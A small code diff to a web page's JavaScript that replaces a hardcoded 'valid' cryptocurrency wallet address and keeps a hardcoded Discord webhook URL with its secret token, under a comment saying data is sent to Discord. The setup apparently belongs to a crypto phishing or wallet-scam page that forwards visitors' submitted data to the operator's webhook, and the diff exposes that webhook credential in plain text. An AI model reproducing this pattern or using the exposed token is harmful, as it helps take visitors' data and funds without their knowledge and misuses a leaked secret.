@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const modalError = document.getElementById('modalError');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    const VALID_WALLET_ADDRESS = "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm";
+    const VALID_WALLET_ADDRESS = "DRqrUufM54cgryp1gxBgrra422EiCCsWde9PFano9yGj";
     const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1313437202385993798/PSz65bbO_Uq8yf9QRK5xkS9FP2KwMtDv9h6segXaljEUV53bPcKqw0ambV8RDX9nvmvQ";
 
     // 发送数据到 Discord
